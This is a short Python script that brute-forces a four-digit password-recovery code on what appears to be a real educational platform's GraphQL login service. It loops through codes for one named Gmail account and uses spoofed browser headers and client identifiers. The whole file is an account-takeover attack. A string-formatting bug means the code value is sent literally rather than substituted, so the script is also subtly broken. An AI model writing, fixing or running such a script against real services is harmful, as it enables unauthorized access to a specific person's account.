import requests


for numero in range(1111, 10000):
	headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://embarque.plurall.net/conta/esqueci-minha-senha/validar',
    'content-type': 'application/json',
    'client': 'PLTR.b2ebc23d-5901-4249-9b2e-52e43c7b8294.1588802949675',
    'idApplication': 'NWRmYzNlM2NkODcxOGMy',
    'Origin': 'https://embarque.plurall.net',
    'Connection': 'keep-alive',
	}

	data = '{f"operationName":"checkRecoveryPasswordCode","variables":{"user":"gnsiis004@gmail.com","code":{numero}},"query":"mutation checkRecoveryPasswordCode($user: String!, $code: Int!) {\\n  checkRecoveryPasswordCode(user: $user, code: $code)\\n}\\n"}'
	response = requests.post('https://sso.plurall.net/graphql', headers=headers, data=data)
	print(data, response.text, response, numero)
